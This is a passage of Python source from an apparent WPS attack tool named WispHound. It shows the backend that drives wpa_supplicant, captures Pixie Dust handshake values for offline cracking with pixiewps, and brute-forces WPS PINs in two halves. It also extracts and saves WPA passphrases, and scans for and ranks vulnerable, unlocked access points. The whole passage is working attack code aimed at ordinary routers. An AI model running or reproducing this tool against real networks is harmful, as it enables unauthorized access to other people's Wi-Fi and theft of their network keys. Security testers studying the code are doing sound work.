        self.conn.commit()

    def load_capture(self, bssid):
        r = self.conn.execute('SELECT pixie_capture FROM targets WHERE bssid=?',
                              (bssid,)).fetchone()
        if r and r[0]:
            try: return PixiewpsData.from_dict(json.loads(r[0]))
            except Exception: return None
        return None

    def set_lockout(self, bssid, seconds):
        until = (datetime.utcnow() + timedelta(seconds=seconds)).isoformat()
        self.conn.execute('UPDATE targets SET lockout_until=? WHERE bssid=?', (until, bssid))
        self.conn.commit()

    def is_locked(self, bssid):
        r = self.conn.execute('SELECT lockout_until FROM targets WHERE bssid=?',
                              (bssid,)).fetchone()
        if not r or not r[0]: return False
        try: return datetime.fromisoformat(r[0]) > datetime.utcnow()
        except Exception: return False

    def close(self):
        try: self.conn.close()
        except Exception: pass


# ---------------------------------------------------------------------------
# Companion (internal backend)
# ---------------------------------------------------------------------------
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False,
                 bssid='', db: Optional[TargetDB] = None,
                 json_mode=False, trace_log=None, pixiewps_timeout=120,
                 cool_down=60, auto_mode=False, save_capture=False,
                 dry_run=False, json_stdout=None, lockout_budget=0):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.json_mode = json_mode
        self.pixiewps_timeout = pixiewps_timeout
        self.cool_down = cool_down
        self.auto_mode = auto_mode
        self.save_capture = save_capture
        self.dry_run = dry_run
        self.json_stdout = json_stdout or sys.stdout
        self.lockout_budget = lockout_budget
        self._constructed = False
        self._line_q = queue.Queue()
        self._reader_stop = threading.Event()
        self._reader_thread = None

        self.tempdir = tempfile.mkdtemp()
        try:
            self.tempconf = os.path.join(self.tempdir, 'wpa.conf')
            with open(self.tempconf, 'w', encoding='utf-8') as f:
                f.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.wpas_ctrl_path = f'{self.tempdir}/{interface}'
            self.__init_wpa_supplicant()
            self.res_socket_file = os.path.join(tempfile.gettempdir(), f'wh-{uuid.uuid4().hex}.sock')
            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.retsock.bind(self.res_socket_file)
        except Exception:
            self._cleanup_partial(); raise

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        home = _homedir()
        self.sessions_dir = os.path.join(home, '.WispHound', 'sessions')
        self.pixiewps_dir = os.path.join(home, '.WispHound', 'pixiewps')
        self.reports_dir = pick_reports_dir()
        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
            _safe_makedirs(d)

        self.db = db or TargetDB(os.path.join(home, '.WispHound', 'targets.db'))
        self._own_db = db is None
        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0
        self.target_is_pixie_vuln = False
        self.target_chipset = ''
        self._trace_fp = open(trace_log, 'a', encoding='utf-8') if trace_log else None
        self._constructed = True

    def _cleanup_partial(self):
        self._reader_stop.set()
        if self._reader_thread: self._reader_thread.join(timeout=1)
        try:
            if getattr(self, 'retsock', None): self.retsock.close()
        except Exception: pass
        try:
            if getattr(self, 'res_socket_file', None) and os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
        except Exception: pass
        try:
            if getattr(self, 'wpas', None):
                self.wpas.terminate()
                try: self.wpas.wait(timeout=2)
                except Exception: self.wpas.kill()
        except Exception: pass
        shutil.rmtree(getattr(self, 'tempdir', ''), ignore_errors=True)
        try: os.remove(getattr(self, 'tempconf', ''))
        except Exception: pass

    def cleanup(self):
        self._cleanup_partial()
        if getattr(self, '_trace_fp', None):
            try: self._trace_fp.close()
            except Exception: pass
        if getattr(self, '_own_db', False) and getattr(self, 'db', None):
            self.db.close()

    def __del__(self):
        try: self.cleanup()
        except Exception: pass

    def __init_wpa_supplicant(self):
        if self.dry_run:
            self.wpas = None; return
        print(UI.msg('run', 'Running wpa_supplicant…'), file=sys.stderr)
        argv = ['wpa_supplicant', '-K', '-d', '-Dnl80211,wext,hostapd,wired',
                f'-i{self.interface}', f'-c{self.tempconf}']
        self.wpas = subprocess.Popen(
            argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            encoding='utf-8', errors='replace', start_new_session=True)
        _register_child(self.wpas)
        def reader():
            try:
                for line in self.wpas.stdout:
                    if self._reader_stop.is_set(): break
                    self._line_q.put(line.rstrip('\n'))
            except Exception: pass
            finally: self._line_q.put(None)
        self._reader_thread = threading.Thread(target=reader, daemon=True)
        self._reader_thread.start()
        deadline = time.time() + 10
        while time.time() < deadline:
            if self.wpas.poll() is not None:
                raise ValueError(f'wpa_supplicant exited rc={self.wpas.returncode}')
            if os.path.exists(self.wpas_ctrl_path):
                return
            time.sleep(0.05)
        raise ValueError('wpa_supplicant did not create control socket within 10s')

    def sendOnly(self, command):
        if self.dry_run: return
        try: self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        except Exception: pass

    def sendAndReceive(self, command):
        if self.dry_run: return 'OK'
        try:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
            b, _ = self.retsock.recvfrom(4096)
            return b.decode('utf-8', errors='replace')
        except Exception: return ''

    def _drain_q(self, timeout=0.05):
        try: line = self._line_q.get(timeout=timeout)
        except queue.Empty: return True
        if line is None: return False
        self._process_line(line)
        while True:
            try: line = self._line_q.get_nowait()
            except queue.Empty: break
            if line is None: return False
            self._process_line(line)
        return True

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
            return ('[!] wpa_supplicant is compiled without WPS support (CONFIG_WPS=y)')
        return '[!] Something went wrong — check --trace-log'

    def _emit_json(self, event, **fields):
        if not self.json_mode: return
        rec = {'ts': datetime.now().isoformat(), 'event': event, **fields}
        print(json.dumps(rec, ensure_ascii=False), file=self.json_stdout, flush=True)

    def _process_line(self, line):
        if self.print_debug:
            sys.stderr.write(line + '\n')
        if self._trace_fp: self._trace_fp.write(line + '\n')
        if line.startswith('WPS: '):
            self._handle_wps_line(line)
        elif ': State: ' in line and '-> SCANNING' in line:
            self.connection_status.status = 'scanning'
            self.__print_with_indicators('*', 'Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            print(UI.msg('err', 'wpa_supplicant returned WPS-FAIL'), file=sys.stderr)
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line: self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line: self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Associating…')
        elif 'Associated with' in line and self.interface in line:
            b = line.split()[-1].upper() if line.split() else '?'
            self.__print_with_indicators('+', f'Associated with {b}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
        elif self.bssid and self.bssid.lower() in line.lower() and 'level=' in line:
            try: self.lastPwr = line.split('level=')[1].split(' ')[0]
            except IndexError: pass
        elif 'selected BSS ' in line:
            try: self.connection_status.bssid = line.split('selected BSS ')[-1].split()[0].upper()
            except IndexError: pass

    def _handle_wps_line(self, line):
        pairs = (
            ('Enrollee Nonce', 'e_nonce', 'E-Nonce'),
            ('Registrar Nonce', 'r_nonce', 'R-Nonce'),
            ('DH own Public Key', 'pkr', 'PKR'),
            ('DH peer Public Key', 'pke', 'PKE'),
            ('AuthKey', 'authkey', 'AuthKey'),
            ('E-Hash1', 'e_hash1', 'E-Hash1'),
            ('E-Hash2', 'e_hash2', 'E-Hash2'),
            ('E-S1', 'e_s1', 'E-S1'),
            ('E-S2', 'e_s2', 'E-S2'),
            ('R-S1', 'r_s1', 'R-S1'),
            ('R-S2', 'r_s2', 'R-S2'),
        )
        if 'Building Message M' in line:
            try: n = int(line.split('Building Message M')[1].replace('D', ''))
            except (ValueError, IndexError): n = 0
            self.connection_status.last_m_message = n
            self.__print_with_indicators('*', f'Sending M{n}…')
            return
        if 'Received M' in line:
            try: n = int(line.split('Received M')[1])
            except (ValueError, IndexError): n = 0
            self.connection_status.last_m_message = n
            self.__print_with_indicators('*', f'Received M{n}')
            if n == 5:
                print(UI.msg('ok', 'First half of the PIN is valid'), file=sys.stderr)
            return
        if 'Received WSC_NACK' in line:
            self.connection_status.status = 'WSC_NACK'
            self.connection_status.nack_count += 1
            print(UI.msg('err', 'WSC NACK — wrong PIN'), file=sys.stderr)
            return
        if 'Network Key' in line and 'hexdump' in line:
            self.connection_status.status = 'GOT_PSK'
            try:
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
            except Exception: pass
            return
        if 'hexdump' not in line: return
        for needle, attr, label in pairs:
            if needle in line:
                val = get_hex(line)
                if val:
                    setattr(self.pixie_creds, attr, val)
                    if self.print_debug:
                        print(UI.muted(f'[P] {label}: {val}'), file=sys.stderr)
                return

    @staticmethod
    def _extract_essid(line):
        try:
            raw = "'".join(line.split("'")[1:-1])
            try:
                b = codecs.escape_decode(raw.encode('latin1', 'replace'))[0]
                return b.decode('utf-8', errors='replace')
            except Exception:
                return raw
        except Exception:
            return ''

    def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
        self.__print_with_indicators('*', 'Running pixiewps…')
        self.__print_with_indicators('P', self.pixie_creds.status_line())
        try:
            argv = self.pixie_creds.get_pixie_args(full_range, timeout=self.pixiewps_timeout)
        except ValueError as e:
            print(UI.msg('err', f'Pixiewps data validation failed: {e}'), file=sys.stderr)
            return False
        if showcmd or self.dry_run:
            print(UI.muted('  ' + ' '.join(argv)), file=sys.stderr)
        self._emit_json('pixiewps_start', argv=argv, full_range=full_range)
        if self.dry_run: return False
        try:
            rc, out = run_proc(argv, timeout=self.pixiewps_timeout,
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               encoding='utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            print(UI.msg('err', f'pixiewps timed out after {self.pixiewps_timeout}s'),
                  file=sys.stderr)
            return False
        except FileNotFoundError:
            print(UI.msg('err', 'pixiewps not found'), file=sys.stderr)
            return False
        out = out or ''
        print(out, file=sys.stderr)
        self._emit_json('pixiewps_output', rc=rc, out=out)
        if rc != 0 and 'WPS pin' not in out: return False
        m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
        if m:
            pin = m.group(1).strip()
            if pin == '<empty>': return ''
            if pin.isdigit() and len(pin) == 8: return pin
            if pin.isdigit() and len(pin) == 7:
                return pin + str(self.generator.checksum(int(pin)))
        if _retry and not full_range and ('force' in out.lower() or 'full range' in out.lower()):
            print(UI.msg('info', 'Retrying with --force…'), file=sys.stderr)
            return self.__runPixiewps(showcmd, full_range=True, _retry=False)
        return False

    def __credentialPrint(self, pin, psk, essid):
        print(UI.section('Credentials recovered'), file=sys.stderr)
        print(UI.table(['Field', 'Value'],
                       [[UI.muted('WPS PIN'), UI.ok(pin)],
                        [UI.muted('WPA PSK'), UI.ok(psk)],
                        [UI.muted('ESSID'),   UI.hi(essid or '—')]]), file=sys.stderr)
        self._emit_json('credentials', wps_pin=pin, wpa_psk=psk, essid=essid)

    def __saveResult(self, bssid, essid, pin, psk):
        _save_result(self.db, bssid, essid, pin, psk, self.reports_dir,
                     self.json_mode, self.json_stdout)

    def __savePin(self, bssid, pin):
        if not pin or not isinstance(pin, str): return
        filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
        _safe_makedirs(self.pixiewps_dir)
        try:
            with open(filename, 'w', encoding='utf-8') as f: f.write(pin)
        except OSError as e:
            print(UI.msg('err', f'Cannot save PIN to {filename}: {e}'), file=sys.stderr)
            return
        self._emit_json('pin_saved', bssid=bssid, pin=pin, path=filename)

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggestedUnique(bssid)
        if not pins: return None
        if len(pins) > 1:
            print(UI.section(f'PINs generated for {bssid}'), file=sys.stderr)
            print(UI.table(['#', 'PIN', 'Name'],
                           [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
                            for i, p in enumerate(pins)],
                           aligns=['r', 'l', 'l']), file=sys.stderr)
            while True:
                try:
                    c = input(UI.info('Select PIN: ')).strip()
                    i = int(c)
                    if 1 <= i <= len(pins): return pins[i - 1]['pin']
                except (ValueError, EOFError, KeyboardInterrupt):
                    return None
        return pins[0]['pin']

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                         pbc_mode=False, verbose=None, max_retries=3):
        if verbose is None: verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        while True:
            try: self._line_q.get_nowait()
            except queue.Empty: break

        if pbc_mode:
            print(UI.msg('info', f'Starting PBC{" to " + bssid if bssid else ""}…'),
                  file=sys.stderr)
            cmd = f'WPS_PBC {bssid}' if bssid else 'WPS_PBC'
        else:
            print(UI.msg('info', f"Trying PIN '{UI.hi(pin)}'…"), file=sys.stderr)
            cmd = f'WPS_REG {bssid} {pin}'

        if self.dry_run:
            print(f'  {UI.muted("[dry-run cmd]")} {cmd}', file=sys.stderr)
            return False

        for attempt in range(1, max_retries + 1):
            r = self.sendAndReceive(cmd)
            if 'OK' not in r:
                self.connection_status.status = 'WPS_FAIL'
                print(UI.msg('err', self._explain_wpas_not_ok_status(cmd, r)), file=sys.stderr)
                if attempt < max_retries:
                    back = 2 ** attempt
                    print(UI.msg('warn', f'Backing off {back}s'), file=sys.stderr)
                    time.sleep(back); continue
                return False
            deadline = time.time() + 120
            while time.time() < deadline:
                if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                    break
                if not self._drain_q(timeout=0.2):
                    break
            self.sendOnly('WPS_CANCEL')
            if self.connection_status.status == 'GOT_PSK': return True
            if self.connection_status.status == 'WPS_FAIL' and attempt < max_retries:
                back = 2 ** attempt
                print(UI.msg('warn', f'WPS transaction failed; backing off {back}s'),
                      file=sys.stderr)
                time.sleep(back); continue
            break
        if self.connection_status.nack_count >= 3:
            print(UI.msg('warn', '3+ NACKs — possible lockout risk'), file=sys.stderr)
            if self.lockout_budget and bssid:
                self.db.set_lockout(bssid, self.cool_down)
            if self.cool_down > 0:
                print(UI.msg('info', f'Cooling down {self.cool_down}s'), file=sys.stderr)
                time.sleep(self.cool_down)
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False,
                          pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not bssid and not pbc_mode:
            print(UI.msg('err', 'No BSSID supplied'), file=sys.stderr); return False
        if bssid and self.lockout_budget and self.db.is_locked(bssid):
            print(UI.msg('warn', f'{bssid} locked — skipping'), file=sys.stderr)
            return False

        if not pin and not pbc_mode and bssid:
            known = self.db.known_pin(bssid)
            if known:
                print(UI.msg('info', f'Known PIN in DB: {known}'), file=sys.stderr)
                pin = known

        if (not pixiemode and not pbc_mode and not pin and bssid
                and self.target_is_pixie_vuln):
            chipset = self.target_chipset or 'unknown chipset'
            print(UI.msg('warn', f'Target looks Pixie Dust vulnerable ({chipset})'),
                  file=sys.stderr)
            if self.auto_mode: pixiemode = True
            else:
                try:
                    if input(UI.info('[?] Try Pixie Dust first? [Y/n] ')).strip().lower() != 'n':
                        pixiemode = True
                except (EOFError, KeyboardInterrupt): pixiemode = True

        if not pin:
            if pixiemode and bssid:
                try:
                    fn = os.path.join(self.pixiewps_dir,
                                      f'{bssid.replace(":", "").upper()}.run')
                    with open(fn, 'r', encoding='utf-8') as f:
                        t_pin = f.readline().strip()
                    if self.auto_mode: pin = t_pin
                    else:
                        try:
                            if input(UI.info(f'[?] Use saved PIN {t_pin}? [n/Y] ')).lower() != 'n':
                                pin = t_pin
                            else: raise FileNotFoundError
                        except (EOFError, KeyboardInterrupt): pin = t_pin
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid)
                    if not pin:
                        print(UI.msg('warn', f'No suggestion for {bssid}'), file=sys.stderr)
                        return False
            elif not pbc_mode and bssid:
                if self.auto_mode: pin = self.generator.getLikely(bssid)
                else: pin = self.__prompt_wpspin(bssid)
                if not pin:
                    print(UI.msg('warn', f'No suggestion for {bssid}'), file=sys.stderr)
                    return False

        if bssid: self.db.bump_attempts(bssid)

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=True)
            bssid = getattr(self.connection_status, 'bssid', bssid) or bssid
            pin = '<PBC>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr)
                if bssid: self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk,
                                   self.connection_status.essid)
            if self.save_result and bssid:
                self.__saveResult(bssid, self.connection_status.essid,
                                  pin, self.connection_status.wpa_psk)
            if not pbc_mode and bssid:
                try: os.remove(os.path.join(
                    self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run'))
                except FileNotFoundError: pass
            return True

        if pixiemode:
            if self.save_capture and bssid and self.pixie_creds.to_dict():
                try: self.db.save_capture(bssid, self.pixie_creds)
                except Exception: pass
                capdir = _captures_dir()
                try:
                    with open(os.path.join(capdir, f'{bssid.replace(":", "").upper()}.json'),
                              'w', encoding='utf-8') as f:
                        f.write(self.pixie_creds.to_json())
                except OSError: pass
            if self.pixie_creds.got_all() or pixieforce:
                new_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if new_pin is not False:
                    return self.single_connection(bssid, new_pin,
                                                  pixiemode=False,
                                                  store_pin_on_fail=True)
                return False
            print(UI.msg('err', f'Not enough Pixie data ({self.pixie_creds.status_line()})'),
                  file=sys.stderr)
            return False

        if store_pin_on_fail and bssid:
            self.__savePin(bssid, pin)
        return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None, _max_retries=3):
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{WPSpin.checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(UI.msg('ok', 'First half found'), file=sys.stderr)
                return f_half
            if self.connection_status.status == 'WPS_FAIL':
                _max_retries -= 1
                if _max_retries <= 0:
                    print(UI.msg('err', 'Max retries reached'), file=sys.stderr)
                    return False
                continue
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            _max_retries = 3
            if delay: time.sleep(delay)
        print(UI.msg('err', 'First half not found'), file=sys.stderr)
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None, _max_retries=3):
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{WPSpin.checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.status == 'WPS_FAIL':
                _max_retries -= 1
                if _max_retries <= 0:
                    print(UI.msg('err', 'Max retries reached'), file=sys.stderr)
                    return False
                continue
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            _max_retries = 3
            if delay: time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None,
                         loop=False, auto_resume=False):
        self.bruteforce = BruteforceStatus()
        if (not start_pin) or (len(start_pin) < 4):
            try:
                fn = os.path.join(self.sessions_dir,
                                  f'{bssid.replace(":", "").upper()}.run')
                with open(fn, 'r', encoding='utf-8') as f:
                    mask = f.readline().strip() or '0000'
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]
        self.bruteforce.mask = mask
        try:
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                self.__second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
            if self.connection_status.status == 'GOT_PSK':
                print(UI.msg('ok', 'Bruteforce complete'), file=sys.stderr)
        except KeyboardInterrupt:
            print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr)
            fn = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
            _safe_makedirs(self.sessions_dir)
            try:
                with open(fn, 'w', encoding='utf-8') as f: f.write(self.bruteforce.mask)
                print(UI.msg('info', f'Session saved in {fn}'), file=sys.stderr)
            except OSError as e:
                print(UI.msg('err', f'Cannot save session: {e}'), file=sys.stderr)
            if loop: raise

    def __print_with_indicators(self, level, msg):
        print(f'{UI.muted(f"[{level}]")} {UI.muted(f"[{self.lastPwr}]")} {msg}',
              file=sys.stderr)


# ---------------------------------------------------------------------------
# Offline replay
# ---------------------------------------------------------------------------
def offline_replay(path, full_range=False, timeout=120, db=None, bssid=None):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        print(UI.msg('err', f'Cannot read capture {path}: {e}'), file=sys.stderr)
        return False
    p = PixiewpsData.from_dict(data)
    print(UI.info(f'Loaded {p!r}'), file=sys.stderr)
    if not p.got_all() and not full_range:
        print(UI.msg('warn', 'Incomplete capture; re-run with --pixie-force'),
              file=sys.stderr)
        return False
    try:
        argv = p.get_pixie_args(full_range=full_range, timeout=timeout)
    except ValueError as e:
        print(UI.msg('err', f'Invalid capture: {e}'), file=sys.stderr)
        return False
    print(UI.muted('  ' + ' '.join(argv)), file=sys.stderr)
    try:
        rc, out = run_proc(argv, timeout=timeout, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(UI.msg('err', f'pixiewps failed: {e}'), file=sys.stderr); return False
    out = out or ''
    print(out, file=sys.stderr)
    m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
    if not m:
        print(UI.msg('err', 'No PIN in pixiewps output'), file=sys.stderr); return False
    pin = m.group(1).strip()
    if pin.isdigit() and len(pin) == 7: pin += str(WPSpin.checksum(int(pin)))
    print(UI.ok(f'WPS PIN: {pin}'), file=sys.stderr)
    if db and bssid:
        db.save_credentials(bssid, '', pin, '')
    return pin


# ---------------------------------------------------------------------------
# WiFiScanner
# ---------------------------------------------------------------------------
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, reverse_scan=False,
                 db=None, min_rssi=None, band=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.reverse_scan = reverse_scan
        self.db = db
        self.min_rssi = min_rssi
        self.band = band
        self.selected_vuln = False
        self.selected_chipset = ''
        self.selected_channel = 0
        self.selected_wps = False
        self.stored = []
        reports = os.path.join(pick_reports_dir(), 'stored.csv')
        try:
            with open(reports, 'r', newline='', encoding='utf-8', errors='replace') as f:
                r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(r, None)
                for row in r:
                    if len(row) >= 3: self.stored.append((row[1], row[2]))
        except FileNotFoundError: pass

    @staticmethod
    def _classify_pixie_vuln(network):
        hay = ' '.join([network.get('Model', ''), network.get('Model number', ''),
                        network.get('Device name', '')]).upper()
        for kw, label in PIXIE_VULNERABLE_CHIPSETS.items():
            if kw.upper() in hay: return True, label
        return False, ''

    def iw_scanner(self):
        networks = []

        def new_net(bssid):
            networks.append({'BSSID': bssid, 'Security type': 'Unknown',
                             'WPS': False, 'WPS version': '', 'WPS locked': False,
                             'Model': '', 'Model number': '', 'Device name': '',
                             'Channel': 0, 'Frequency': 0, 'Level': -100})

        def _decode(d):
            try:
                b = codecs.escape_decode(d.encode('latin1', 'replace'))[0]
                return b.decode('utf-8', errors='replace')
            except Exception:
                return d

        def handle_essid(line, m, nets):
            if nets: nets[-1]['ESSID'] = _decode(m.group(1))
        def handle_level(line, m, nets):
            if nets:
                try: nets[-1]['Level'] = int(float(m.group(1)))
                except ValueError: pass
        def handle_freq(line, m, nets):
            if not nets: return
            f = int(m.group(1)); nets[-1]['Frequency'] = f
            if 2412 <= f <= 2484:
                nets[-1]['Channel'] = 14 if f == 2484 else (f - 2412) // 5 + 1
            elif 5180 <= f <= 5825:
                nets[-1]['Channel'] = (f - 5000) // 5
            elif 5955 <= f <= 7115:
                nets[-1]['Channel'] = (f - 5955) // 20 + 1
        def handle_security(line, m, nets):
            if not nets: return
            sec = nets[-1]['Security type']
            key = m.group(1)
            if key == 'capability':
                nets[-1]['Security type'] = 'WEP' if 'Privacy' in m.group(2) else 'Open'
                return
            if key == 'RSN':
                sec = 'WPA/WPA2' if sec == 'WPA' else 'WPA2'
            elif key == 'WPA':
                sec = 'WPA/WPA2' if sec == 'WPA2' else 'WPA'
            nets[-1]['Security type'] = sec
        def handle_wps(line, m, nets):
            if nets:
                nets[-1]['WPS'] = True
                nets[-1]['WPS version'] = m.group(1)
        def handle_wpsLocked(line, m, nets):
            if nets:
                try:
                    if int(m.group(1), 16): nets[-1]['WPS locked'] = True
                except ValueError: pass
        def handle_model(line, m, nets):
            if nets: nets[-1]['Model'] = _decode(m.group(1))
        def handle_modelNumber(line, m, nets):
            if nets: nets[-1]['Model number'] = _decode(m.group(1))
        def handle_deviceName(line, m, nets):
            if nets: nets[-1]['Device name'] = _decode(m.group(1))

        try:
            _, out = run_proc(['iw', 'dev', self.interface, 'scan'],
                              timeout=60, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT,
                              encoding='utf-8', errors='replace')
        except FileNotFoundError:
            print(UI.msg('err', 'iw not found'), file=sys.stderr); return False
        except subprocess.TimeoutExpired:
            print(UI.msg('err', 'iw scan timed out'), file=sys.stderr); return False

        matchers = [
            (re.compile(r'BSS (\S+)(?:\(on \w+\))?'), lambda line, m, nets: new_net(m.group(1).upper())),
            (re.compile(r'SSID: (.*)'), handle_essid),
            (re.compile(r'freq: (\d+)'), handle_freq),
            (re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'), handle_level),
            (re.compile(r'(capability): (.+)'), handle_security),
            (re.compile(r'(RSN):\s+\* Version: (\d+)'), handle_security),
            (re.compile(r'(WPA):\s+\* Version: (\d+)'), handle_security),
            (re.compile(r'WPS:\s+\* Version: (([0-9]*[.])?[0-9]+)'), handle_wps),
            (re.compile(r'\* AP setup locked: (0x[0-9a-fA-F]+)'), handle_wpsLocked),
            (re.compile(r'\* Model: (.*)'), handle_model),
            (re.compile(r'\* Model Number: (.*)'), handle_modelNumber),
            (re.compile(r'\* Device name: (.*)'), handle_deviceName),
        ]
        for line in (out or '').splitlines():
            if line.startswith('command failed:'):
                print(UI.msg('err', f'iw: {line}'), file=sys.stderr); return False
            s = line.strip('\t')
            for rx, h in matchers:
                m = re.match(rx, s)
                if m: h(s, m, networks)

        if self.min_rssi is not None:
            networks = [n for n in networks if n.get('Level', -100) >= self.min_rssi]
        if self.band:
            rng = {'2.4': (2400, 2500), '5': (5000, 5900), '6': (5900, 7200)}.get(self.band)
            if rng: networks = [n for n in networks if rng[0] <= n.get('Frequency', 0) <= rng[1]]
        if not networks: return False

        for net in networks:
            vuln, chipset = self._classify_pixie_vuln(net)
            net['Pixie vulnerable'] = vuln and bool(net.get('WPS'))
            net['Chipset'] = chipset
            if self.db:
                net['Vendor'] = self.db.vendor_for(net['BSSID'])
                try: self.db.upsert(net)
                except Exception: pass

        networks.sort(key=lambda x: (not x.get('WPS', False),
                                     not x.get('Pixie vulnerable', False),
                                     x.get('WPS locked', False),
                                     -x.get('Level', -100)))
        network_list = {(i + 1): n for i, n in enumerate(networks)}

        def trunc(s, length, postfix='…'):
            if wcwidth.wcswidth(s) <= length: return s
            out, cur = [], 0
            pw = wcwidth.wcswidth(postfix)
            for c in s:
                cw = wcwidth.wcswidth(c)
                if cur + cw > length - pw: break
                out.append(c); cur += cw
            return ''.join(out) + postfix

        print(UI.muted('Legend: ') + '  '.join([
            UI.ok('● vulnerable'), UI.err('● WPS locked'),
            UI.warn('● already stored'), UI.info('● Pixie-vulnerable'),
            UI.muted('● no WPS')]), file=sys.stderr)
        rows = []
        items = list(network_list.items())
        if self.reverse_scan: items = items[::-1]
        for n, net in items:
            model = f"{net['Model']} {net['Model number']}".strip()
            essid = trunc(net.get('ESSID', 'HIDDEN'), 24)
            dev = trunc(net['Device name'], 22)
            wps = UI.ok('yes') if net.get('WPS') else UI.muted('no')
            row = [str(n), net['BSSID'], essid, net['Security type'],
                   str(net['Level']), str(net.get('Channel', '')), wps,
                   dev, model]
            if not net.get('WPS'):
                row = [UI.muted(c) for c in row]
            elif net.get('Pixie vulnerable'):
                row = [UI.info(c) for c in row]
            elif (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
                row = [UI.warn(c) for c in row]
            elif net.get('WPS locked'):
                row = [UI.err(c) for c in row]
            rows.append(row)
        print(UI.table(['#', 'BSSID', 'ESSID', 'Security', 'PWR', 'Ch',
                        'WPS', 'WSC device name', 'WSC model'], rows,
                       aligns=['r', 'l', 'l', 'l', 'r', 'r', 'c', 'l', 'l'],
                       max_widths=[4, 17, 24, 12, 5, 4, 5, 22, 30],
                       title=f'Networks ({len(rows)} APs)'), file=sys.stderr)
        return network_list

    def prompt_network(self):
        with UI.spinner('Scanning for networks'):
            networks = self.iw_scanner()
        if not networks:
            print(UI.msg('err', 'No networks found'), file=sys.stderr); return None
        while True:
            try:
                c = input(UI.info('Select target (Enter=refresh): ')).strip()
                if c.lower() in ('r', '0', ''): return self.prompt_network()
                i = int(c)
                if i in networks:
                    t = networks[i]
                    if not t.get('WPS'):
                        print(UI.msg('warn', f"{t['BSSID']} has no WPS"), file=sys.stderr)
                    self.selected_vuln = t.get('Pixie vulnerable', False)
                    self.selected_chipset = t.get('Chipset', '')
                    self.selected_channel = t.get('Channel', 0)
